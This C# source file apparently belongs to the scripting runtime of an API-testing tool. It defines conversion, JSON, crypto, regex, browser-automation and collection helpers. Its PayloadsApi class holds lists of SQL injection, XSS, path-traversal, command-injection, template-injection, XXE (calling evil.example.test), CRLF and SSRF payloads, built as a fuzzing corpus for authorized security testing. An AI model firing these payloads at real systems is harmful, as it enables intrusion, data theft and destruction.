            string stringValue when long.TryParse(stringValue, NumberStyles.Integer, CultureInfo.InvariantCulture, out long parsedLongValue) => parsedLongValue,
            string stringValue when decimal.TryParse(stringValue, NumberStyles.Number, CultureInfo.InvariantCulture, out decimal parsedDecimalValue) && parsedDecimalValue is >= long.MinValue and <= long.MaxValue => (long)decimal.Truncate(parsedDecimalValue),
            _ => fallback,
        };
    }

    public double ToDouble(object? value, double fallback = 0d)
    {
        object? normalizedValue = NormalizeValue(value);
        return normalizedValue switch
        {
            null => fallback,
            double doubleValue when double.IsFinite(doubleValue) => doubleValue,
            decimal decimalValue => (double)decimalValue,
            long longValue => longValue,
            int intValue => intValue,
            bool boolValue => boolValue ? 1d : 0d,
            string stringValue when double.TryParse(stringValue, NumberStyles.Float | NumberStyles.AllowThousands, CultureInfo.InvariantCulture, out double parsedDoubleValue) && double.IsFinite(parsedDoubleValue) => parsedDoubleValue,
            _ => fallback,
        };
    }

    public decimal ToDecimal(object? value, decimal fallback = 0m)
    {
        object? normalizedValue = NormalizeValue(value);
        return normalizedValue switch
        {
            null => fallback,
            decimal decimalValue => decimalValue,
            int intValue => intValue,
            long longValue => longValue,
            double doubleValue when double.IsFinite(doubleValue) => (decimal)doubleValue,
            bool boolValue => boolValue ? 1m : 0m,
            string stringValue when decimal.TryParse(stringValue, NumberStyles.Number, CultureInfo.InvariantCulture, out decimal parsedDecimalValue) => parsedDecimalValue,
            _ => fallback,
        };
    }

    public bool ToBool(object? value, bool fallback = false)
    {
        object? normalizedValue = NormalizeValue(value);
        return normalizedValue switch
        {
            null => fallback,
            bool boolValue => boolValue,
            int intValue => intValue != 0,
            long longValue => longValue != 0,
            decimal decimalValue => decimalValue != 0m,
            double doubleValue when double.IsFinite(doubleValue) => Math.Abs(doubleValue) > double.Epsilon,
            string stringValue => TryParseBoolean(stringValue, fallback),
            _ => fallback,
        };
    }

    internal static string FormatValue(object? value)
    {
        object? normalizedValue = NormalizeValue(value);
        return normalizedValue switch
        {
            null => string.Empty,
            string stringValue => stringValue,
            bool boolValue => boolValue ? "true" : "false",
            DateTimeOffset dateTimeOffsetValue => dateTimeOffsetValue.ToString("O", CultureInfo.InvariantCulture),
            DateTime dateTimeValue => dateTimeValue.ToString("O", CultureInfo.InvariantCulture),
            IFormattable formattable => formattable.ToString(null, CultureInfo.InvariantCulture) ?? string.Empty,
            _ => normalizedValue.ToString() ?? string.Empty,
        };
    }

    internal static object? NormalizeValue(object? value)
    {
        return value switch
        {
            DynamicJsonNull => null,
            JsonValue jsonValue => UnwrapJsonValue(jsonValue),
            JsonObject jsonObject => jsonObject.ToJsonString(),
            JsonArray jsonArray => jsonArray.ToJsonString(),
            _ => value,
        };
    }

    private static bool TryParseBoolean(string value, bool fallback)
    {
        string normalized = value?.Trim() ?? string.Empty;
        if (bool.TryParse(normalized, out bool parsedBoolValue))
        {
            return parsedBoolValue;
        }

        if (long.TryParse(normalized, NumberStyles.Integer, CultureInfo.InvariantCulture, out long parsedNumericValue))
        {
            return parsedNumericValue != 0;
        }

        if (string.Equals(normalized, "yes", StringComparison.OrdinalIgnoreCase) ||
            string.Equals(normalized, "y", StringComparison.OrdinalIgnoreCase) ||
            string.Equals(normalized, "on", StringComparison.OrdinalIgnoreCase))
        {
            return true;
        }

        if (string.Equals(normalized, "no", StringComparison.OrdinalIgnoreCase) ||
            string.Equals(normalized, "n", StringComparison.OrdinalIgnoreCase) ||
            string.Equals(normalized, "off", StringComparison.OrdinalIgnoreCase))
        {
            return false;
        }

        return fallback;
    }

    private static object? UnwrapJsonValue(JsonValue value)
    {
        if (value.TryGetValue<string>(out string? stringValue))
        {
            return stringValue;
        }

        if (value.TryGetValue<bool>(out bool boolValue))
        {
            return boolValue;
        }

        if (value.TryGetValue<int>(out int intValue))
        {
            return intValue;
        }

        if (value.TryGetValue<long>(out long longValue))
        {
            return longValue;
        }

        if (value.TryGetValue<decimal>(out decimal decimalValue))
        {
            return decimalValue;
        }

        if (value.TryGetValue<double>(out double doubleValue))
        {
            return doubleValue;
        }

        return value.ToJsonString().Trim('"');
    }
}

public sealed class JsonApi
{
    #region Private Fields

    private readonly JsonNodeSelector selector = new();

    #endregion

    #region Public Methods

    public JsonNode? Parse(string content)
    {
        return string.IsNullOrWhiteSpace(content) ? null : JsonNode.Parse(content);
    }

    public string Stringify(JsonNode? node, bool writeIndented = true)
    {
        return node?.ToJsonString(new()
        {
            WriteIndented = writeIndented,
        }) ?? string.Empty;
    }

    public string? Select(JsonNode? node, string selectorText)
    {
        return selector.Select(node, selectorText);
    }

    #endregion
}

public sealed class EncodingApi
{
    public string Base64Encode(string value)
    {
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(value ?? string.Empty));
    }

    public string Base64Decode(string value)
    {
        if (string.IsNullOrWhiteSpace(value))
        {
            return string.Empty;
        }

        byte[] bytes = Convert.FromBase64String(value);
        return Encoding.UTF8.GetString(bytes);
    }

    public string UrlEncode(string value)
    {
        return Uri.EscapeDataString(value ?? string.Empty);
    }

    public string UrlDecode(string value)
    {
        return Uri.UnescapeDataString(value ?? string.Empty);
    }
}

public sealed class CryptoApi
{
    public string Md5(string value)
    {
        using var algorithm = System.Security.Cryptography.MD5.Create();
        return Hash(value, algorithm);
    }

    public string Sha1(string value)
    {
        using var algorithm = SHA1.Create();
        return Hash(value, algorithm);
    }

    public string Sha256(string value)
    {
        using var algorithm = SHA256.Create();
        return Hash(value, algorithm);
    }

    private static string Hash(string value, HashAlgorithm algorithm)
    {
        byte[] input = Encoding.UTF8.GetBytes(value ?? string.Empty);
        byte[] hash = algorithm.ComputeHash(input);
        return Convert.ToHexString(hash).ToLowerInvariant();
    }
}

public sealed class RegexApi
{
    public bool IsMatch(string input, string pattern, bool ignoreCase = false)
    {
        return Regex.IsMatch(input ?? string.Empty, pattern ?? string.Empty, BuildOptions(ignoreCase));
    }

    public string Match(string input, string pattern, int group = 0, bool ignoreCase = false)
    {
        System.Text.RegularExpressions.Match regexMatch = Regex.Match(input ?? string.Empty, pattern ?? string.Empty, BuildOptions(ignoreCase));
        return regexMatch.Success && group >= 0 && group < regexMatch.Groups.Count
            ? regexMatch.Groups[group].Value
            : string.Empty;
    }

    public IReadOnlyList<string> Matches(string input, string pattern, int group = 0, bool ignoreCase = false)
    {
        MatchCollection matches = Regex.Matches(input ?? string.Empty, pattern ?? string.Empty, BuildOptions(ignoreCase));
        return
        [
            .. matches
                .Cast<System.Text.RegularExpressions.Match>()
                .Where(static match => match.Success)
                .Select(match => group >= 0 && group < match.Groups.Count ? match.Groups[group].Value : string.Empty)
        ];
    }

    private static RegexOptions BuildOptions(bool ignoreCase)
    {
        return ignoreCase ? RegexOptions.IgnoreCase | RegexOptions.CultureInvariant : RegexOptions.CultureInvariant;
    }
}

public sealed class RandomApi
{
    #region Private Fields

    private readonly Random random = Random.Shared;

    #endregion

    #region Public Methods

    public Guid Guid()
    {
        return System.Guid.NewGuid();
    }

    public int Number(int minimumInclusive, int maximumExclusive)
    {
        return random.Next(minimumInclusive, maximumExclusive);
    }

    #endregion
}

/// <summary>
/// Curated security-test payload catalog that script authors can use directly
/// from flow code, e.g. `foreach p in payloads.sqli { request.url = $".../?q={p}"; request.send() }`.
/// Every category is a publicly-documented fuzzing corpus used by tools like
/// SecLists, Burp Intruder, and OWASP WSTG. For-Rest's product intent explicitly
/// targets security-minded power users running *authorized* testing — these are
/// defensive building blocks, not exploit kits.
/// </summary>
public sealed class PayloadsApi
{
    #region Private Fields

    private readonly IReadOnlyDictionary<string, IReadOnlyList<string>> customCategories;

    private static readonly IReadOnlyList<string> SqliPayloads =
    [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1' AND SLEEP(5)--",
        "1' AND 1=CONVERT(int,(SELECT @@version))--",
        "admin'--",
        "admin' #",
        "' OR 1=1--",
        "\"; DROP TABLE users;--",
    ];

    private static readonly IReadOnlyList<string> XssPayloads =
    [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "';alert(1);//",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
    ];

    private static readonly IReadOnlyList<string> PathTraversalPayloads =
    [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd",
        "/etc/passwd%00",
    ];

    private static readonly IReadOnlyList<string> CommandInjectionPayloads =
    [
        "; id",
        "| id",
        "&& id",
        "`id`",
        "$(id)",
        "; sleep 5",
        "| sleep 5",
        "|| sleep 5",
        "\n id",
        "%0a id",
    ];

    private static readonly IReadOnlyList<string> SstiPayloads =
    [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "${{7*7}}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
    ];

    private static readonly IReadOnlyList<string> OpenRedirectPayloads =
    [
        "//evil.example.test",
        "https://evil.example.test",
        "/\\evil.example.test",
        "///evil.example.test",
        "https:evil.example.test",
        "//google.com%2F@evil.example.test",
    ];

    private static readonly IReadOnlyList<string> XxePayloads =
    [
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://evil.example.test/\">]><r>&x;</r>",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://evil.example.test/x.dtd\">%p;]><r/>",
    ];

    private static readonly IReadOnlyList<string> NoSqliPayloads =
    [
        "{\"$ne\":null}",
        "{\"$gt\":\"\"}",
        "{\"$regex\":\".*\"}",
        "';return true;var dummy='",
        "'; return JSON.stringify(this); var dummy='",
        "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
    ];

    private static readonly IReadOnlyList<string> CrlfInjectionPayloads =
    [
        "%0d%0aSet-Cookie:%20forrest=injected",
        "%0aSet-Cookie:%20forrest=injected",
        "%0d%0aLocation:%20https://evil.example.test",
        "\r\nSet-Cookie: forrest=injected",
    ];

    private static readonly IReadOnlyList<string> SsrfPayloads =
    [
        "http://127.0.0.1",
        "http://127.0.0.1:80",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:11211/stat",
    ];

    #endregion

    #region Constructors

    public PayloadsApi()
        : this(new Dictionary<string, IReadOnlyList<string>>(StringComparer.OrdinalIgnoreCase))
    {
    }

    public PayloadsApi(IReadOnlyDictionary<string, IReadOnlyList<string>> customCategories)
    {
        this.customCategories = customCategories ?? new Dictionary<string, IReadOnlyList<string>>(StringComparer.OrdinalIgnoreCase);
    }

    #endregion

    #region Public Properties

    public IReadOnlyList<string> Sqli => SqliPayloads;

    public IReadOnlyList<string> Xss => XssPayloads;

    public IReadOnlyList<string> PathTraversal => PathTraversalPayloads;

    public IReadOnlyList<string> CommandInjection => CommandInjectionPayloads;

    public IReadOnlyList<string> Ssti => SstiPayloads;

    public IReadOnlyList<string> OpenRedirect => OpenRedirectPayloads;

    public IReadOnlyList<string> Xxe => XxePayloads;

    public IReadOnlyList<string> NoSqli => NoSqliPayloads;

    public IReadOnlyList<string> CrlfInjection => CrlfInjectionPayloads;

    public IReadOnlyList<string> Ssrf => SsrfPayloads;

    #endregion

    #region Public Methods

    /// <summary>
    /// Returns a named payload category. Built-in keys:
    /// `sqli`, `xss`, `path_traversal`, `command_injection`, `ssti`,
    /// `open_redirect`, `xxe`, `nosqli`, `crlf`, `ssrf`. Custom categories
    /// registered via workspace variables or settings are searched first
    /// so projects can override the defaults with their own wordlists.
    /// </summary>
    public IReadOnlyList<string> Category(string name)
    {
        if (string.IsNullOrWhiteSpace(name))
        {
            return [];
        }

        string normalized = name.Trim();
        if (customCategories.TryGetValue(normalized, out IReadOnlyList<string>? custom))
        {
            return custom ?? [];
        }

        return normalized.Replace("-", "_", StringComparison.Ordinal).ToLowerInvariant() switch
        {
            "sqli" or "sql" or "sql_injection" => SqliPayloads,
            "xss" or "cross_site_scripting" => XssPayloads,
            "path_traversal" or "lfi" or "traversal" => PathTraversalPayloads,
            "command_injection" or "cmdi" or "rce" => CommandInjectionPayloads,
            "ssti" or "template_injection" => SstiPayloads,
            "open_redirect" or "redirect" => OpenRedirectPayloads,
            "xxe" or "xml_external_entity" => XxePayloads,
            "nosqli" or "nosql" or "nosql_injection" => NoSqliPayloads,
            "crlf" or "crlf_injection" => CrlfInjectionPayloads,
            "ssrf" => SsrfPayloads,
            _ => [],
        };
    }

    /// <summary>
    /// Builds a full payload list by combining the named categories with any
    /// script-supplied extras. Duplicates are removed while preserving the
    /// category order so the first hit from a fuzzer stays deterministic.
    /// </summary>
    public IReadOnlyList<string> Combine(params string[] categoriesOrLiterals)
    {
        List<string> output = [];
        HashSet<string> seen = new(StringComparer.Ordinal);

        foreach (string entry in categoriesOrLiterals ?? [])
        {
            if (string.IsNullOrEmpty(entry))
            {
                continue;
            }

            IReadOnlyList<string> category = Category(entry);
            if (category.Count == 0)
            {
                if (seen.Add(entry))
                {
                    output.Add(entry);
                }

                continue;
            }

            foreach (string payload in category)
            {
                if (seen.Add(payload))
                {
                    output.Add(payload);
                }
            }
        }

        return output;
    }

    /// <summary>
    /// Lists every available payload category name (built-in plus custom).
    /// Useful for building dynamic fuzzing UIs from flow code.
    /// </summary>
    public IReadOnlyList<string> Categories()
    {
        List<string> all =
        [
            "sqli",
            "xss",
            "path_traversal",
            "command_injection",
            "ssti",
            "open_redirect",
            "xxe",
            "nosqli",
            "crlf",
            "ssrf",
        ];

        foreach (string custom in customCategories.Keys)
        {
            if (!all.Contains(custom, StringComparer.OrdinalIgnoreCase))
            {
                all.Add(custom);
            }
        }

        return all;
    }

    #endregion
}

public sealed class WorkspaceApi
{
    private readonly WorkspaceDefinition workspace;
    private readonly VariablesApi variablesApi;
    private readonly ScriptResponseApi responseApi;
    private readonly TestsApi testsApi;
    private readonly ConsoleApi consoleApi;
    private readonly StashApi stashApi;
    private readonly Func<string, IReadOnlyList<VariableDefinition>, Task<ScriptExecutionResult>>? executeWorkspaceRequestAsync;

    public WorkspaceApi(
        WorkspaceDefinition workspace,
        VariablesApi variablesApi,
        ScriptResponseApi responseApi,
        TestsApi testsApi,
        ConsoleApi consoleApi,
        StashApi stashApi,
        Func<string, IReadOnlyList<VariableDefinition>, Task<ScriptExecutionResult>>? executeWorkspaceRequestAsync = null)
    {
        this.workspace = workspace;
        this.variablesApi = variablesApi;
        this.responseApi = responseApi;
        this.testsApi = testsApi;
        this.consoleApi = consoleApi;
        this.stashApi = stashApi;
        this.executeWorkspaceRequestAsync = executeWorkspaceRequestAsync;
    }

    public Guid Id => workspace.Id;

    public string Name => workspace.Name;

    public Task<dynamic> execute(string reference)
    {
        return ExecuteAsync(reference);
    }

    public Task<dynamic> run(string reference)
    {
        return ExecuteAsync(reference);
    }

    public async Task<dynamic> ExecuteAsync(string reference)
    {
        if (executeWorkspaceRequestAsync is null)
        {
            throw new InvalidOperationException("workspace.execute() is unavailable for this request.");
        }

        if (string.IsNullOrWhiteSpace(reference))
        {
            throw new InvalidOperationException("workspace.execute() requires a request name or location.");
        }

        ScriptExecutionResult result = await executeWorkspaceRequestAsync(reference.Trim(), variablesApi.RuntimeVariables());
        consoleApi.Import(result.ConsoleEntries);
        testsApi.Import(result.Tests);
        stashApi.Import(result.Stash);
        variablesApi.MergeRuntimeVariables(result.RuntimeVariables);
        responseApi.Update(result.Response);

        if (!string.IsNullOrWhiteSpace(result.ErrorMessage))
        {
            throw new InvalidOperationException(result.ErrorMessage);
        }

        return new ScriptResponseApi(result.Response);
    }
}

/// <summary>
/// The script-facing <c>browser</c> object. Wraps the engine-agnostic <see cref="IBrowserAutomationBridge"/>
/// so authored and recorded scripts can drive an embedded browser page (navigate, click, type, read,
/// assert) deterministically — no LLM in the loop at replay time. Targets are compact strings such as
/// <c>"#id"</c>, <c>"css=.row"</c>, <c>"xpath=//a"</c>, <c>"text=Save"</c>, <c>"role=button:Save"</c>,
/// or <c>"testid=submit"</c>. Mouse-motion dynamics are tunable via <see cref="MouseSteps"/> and
/// <see cref="MouseStepDelayMs"/>.
/// </summary>
public sealed class ScriptBrowserApi(IBrowserAutomationBridge bridge)
{
    #region Properties

    /// <summary>Number of interpolated points the cursor travels through on its way to a target.</summary>
    public int MouseSteps { get; set; } = 24;

    /// <summary>Delay between cursor steps in milliseconds; raise for slower, more human-like motion.</summary>
    public int MouseStepDelayMs { get; set; } = 8;

    /// <summary>Whether the visible red cursor overlay animates during moves.</summary>
    public bool ShowCursor { get; set; } = true;

    /// <summary>Whether a live browser pane is connected.</summary>
    public bool IsAvailable => bridge.IsAvailable;

    private CursorMotion Motion => new() { Steps = MouseSteps, StepDelayMs = MouseStepDelayMs, Visible = ShowCursor };

    #endregion

    #region Public Methods

    public Task navigate(string url) => bridge.Navigate(url);

    public Task click(string target) => bridge.Click(BrowserTarget.Parse(target), Motion);

    public Task type(string target, string text) => bridge.Type(BrowserTarget.Parse(target), text, Motion);

    public Task press(string keys) => bridge.Press(keys);

    public Task hover(string target) => bridge.Hover(BrowserTarget.Parse(target), Motion);

    public Task<string> getText(string target) => bridge.GetText(BrowserTarget.Parse(target));

    public Task<string> getAttribute(string target, string name) => bridge.GetAttribute(BrowserTarget.Parse(target), name);

    public Task<bool> exists(string target) => bridge.Exists(BrowserTarget.Parse(target));

    public Task<BrowserElementInfo> waitFor(string target, int timeoutMs = 5000) =>
        bridge.WaitFor(BrowserTarget.Parse(target), timeoutMs);

    public Task scrollTo(string target) => bridge.ScrollTo(BrowserTarget.Parse(target));

    public Task select(string target, string value) => bridge.Select(BrowserTarget.Parse(target), value);

    public Task<BrowserElementInfo> find(string target) => bridge.Query(BrowserTarget.Parse(target));

    public Task<BrowserSnapshot> snapshot() => bridge.Snapshot();

    public Task<string> screenshot() => bridge.Screenshot();

    public Task<string> evaluate(string expression) => bridge.Evaluate(expression);

    #endregion
}

public sealed class ScriptGlobals
{
    public required ScriptRequestApi request { get; init; }

    public required dynamic response { get; init; }

    public required VariablesApi variables { get; init; }

    public required TestsApi tests { get; init; }

    public required ConsoleApi console { get; init; }

    public required TimeApi time { get; init; }

    public required StringsApi strings { get; init; }

    public required ConvertApi convert { get; init; }

    public required JsonApi json { get; init; }

    public required EncodingApi encoding { get; init; }

    public required CryptoApi crypto { get; init; }

    public required RegexApi regex { get; init; }

    public required RandomApi random { get; init; }

    public required PayloadsApi payloads { get; init; }

    public required WorkspaceApi workspace { get; init; }

    public required dynamic stash { get; init; }

    public required SnapshotApi snapshot { get; init; }

    public required ScriptBrowserApi browser { get; init; }
}

public static class CollectionApi
{
    #region Public Methods

    public static List<object?> Where(object source, Func<object?, object?> predicate)
    {
        return Materialize(source).Where(item => (bool)predicate(item)).ToList();
    }

    public static List<object?> Select(object source, Func<object?, object?> selector)
    {
        return Materialize(source).Select(item => (object?)selector(item)).ToList();
    }

    public static object? First(object source)
    {
        return Materialize(source).First();
    }

    public static object? First(object source, Func<object?, object?> predicate)
    {
        return Materialize(source).First(item => (bool)predicate(item));
    }

    public static object? FirstOrDefault(object source)
    {
        return Materialize(source).FirstOrDefault() ?? string.Empty;
    }

    public static object? FirstOrDefault(object source, Func<object?, object?> predicate)
    {
        return Materialize(source).FirstOrDefault(item => (bool)predicate(item)) ?? string.Empty;
    }

    public static object? Last(object source)
    {
        return Materialize(source).Last();
    }

    public static object? Last(object source, Func<object?, object?> predicate)
    {
        return Materialize(source).Last(item => (bool)predicate(item));
    }

    public static bool Any(object source)
    {
        return Materialize(source).Any();
    }

    public static bool Any(object source, Func<object?, object?> predicate)
    {
        return Materialize(source).Any(item => (bool)predicate(item));
    }

    public static bool All(object source, Func<object?, object?> predicate)
    {
        return Materialize(source).All(item => (bool)predicate(item));
    }

    public static int Count(object source)
    {
        return Materialize(source).Count();
    }

    public static int Count(object source, Func<object?, object?> predicate)
    {
        return Materialize(source).Count(item => (bool)predicate(item));
    }

    public static List<object?> OrderBy(object source, Func<object?, object?> keySelector)
    {
        return Materialize(source).OrderBy(item => (object?)keySelector(item)).ToList();
    }

    public static List<object?> OrderByDesc(object source, Func<object?, object?> keySelector)
    {
        return Materialize(source).OrderByDescending(item => (object?)keySelector(item)).ToList();
    }

    public static List<object?> Take(object source, int count)
    {
        return Materialize(source).Take(count).ToList();
    }

    public static List<object?> Skip(object source, int count)
    {
        return Materialize(source).Skip(count).ToList();
    }

    public static List<object?> Distinct(object source)
    {
        return Materialize(source).Distinct().ToList();
    }

    public static List<object?> Flatten(object source)
    {
        var result = new List<object?>();
        foreach (var item in Materialize(source))
        {
            if (item is IEnumerable<object?> inner)
            {
                result.AddRange(inner);
            }
            else if (item is IList innerList)
            {
                foreach (var element in innerList)
                {
                    result.Add(element);
                }
            }
            else
            {
                result.Add(item);
            }
        }

        return result;
    }

    public static List<object?> GroupBy(object source, Func<object?, object?> keySelector)
    {
        return Materialize(source)
            .GroupBy(item => (object?)keySelector(item))
            .Select(group => (object?)new List<object?> { group.Key, group.ToList() })
            .ToList();
    }

    public static decimal Sum(object source)
    {
        return Materialize(source).Sum(item => Convert.ToDecimal(item, CultureInfo.InvariantCulture));
    }

    public static decimal Sum(object source, Func<object?, object?> selector)
    {
        return Materialize(source).Sum(item => Convert.ToDecimal(selector(item), CultureInfo.InvariantCulture));
    }

    public static object? Min(object source)
    {
        return Materialize(source).Min();
    }

    public static object? Min(object source, Func<object?, object?> selector)
    {
        return Materialize(source).Min(item => (object?)selector(item));
    }

    public static object? Max(object source)
    {
        return Materialize(source).Max();
    }

    public static object? Max(object source, Func<object?, object?> selector)
    {
        return Materialize(source).Max(item => (object?)selector(item));
    }

    public static decimal Average(object source)
    {
        return Materialize(source).Average(item => Convert.ToDecimal(item, CultureInfo.InvariantCulture));
    }

    public static decimal Average(object source, Func<object?, object?> selector)
    {
        return Materialize(source).Average(item => Convert.ToDecimal(selector(item), CultureInfo.InvariantCulture));
    }

    public static List<object?> ToList(object source)
    {
        return Materialize(source);
    }

    public static List<object?> Reverse(object source)
    {
        var list = Materialize(source);
        list.Reverse();
        return list;
    }

    public static bool Contains(object source, object? value)
    {
        return Materialize(source).Contains(value);
    }

    #endregion

    #region Private Methods

    private static List<object?> Materialize(object source)
    {
        if (source is List<object?> objectList)
        {
            return objectList;
        }

        if (source is IEnumerable<object?> enumerable)
        {
            return enumerable.ToList();
        }

        if (source is IList list)
        {
            return list.Cast<object?>().ToList();
        }

        if (source is IEnumerable nonGeneric and not string)
        {
            var result = new List<object?>();
            foreach (var item in nonGeneric)
            {
                result.Add(item);
            }

            return result;
        }

        throw new InvalidOperationException($"Cannot iterate a value of type '{source?.GetType().Name ?? "null"}'. Collection methods require an array or list.");
    }

    #endregion
}

public static class ScriptRuntimeContext
{
    private static readonly AsyncLocal<ScriptGlobals?> CurrentGlobals = new();

    public static ScriptGlobals Globals =>
        CurrentGlobals.Value ?? throw new InvalidOperationException("Script runtime context is unavailable.");

    public static IDisposable Enter(ScriptGlobals globals)
    {
        ScriptGlobals? previous = CurrentGlobals.Value;
        CurrentGlobals.Value = globals;
        return new Scope(previous);
    }

    private sealed class Scope(ScriptGlobals? previous) : IDisposable
    {
        private bool disposed;

        public void Dispose()
        {
            if (disposed)
            {
                return;
            }

            CurrentGlobals.Value = previous;
            disposed = true;
        }
    }
}
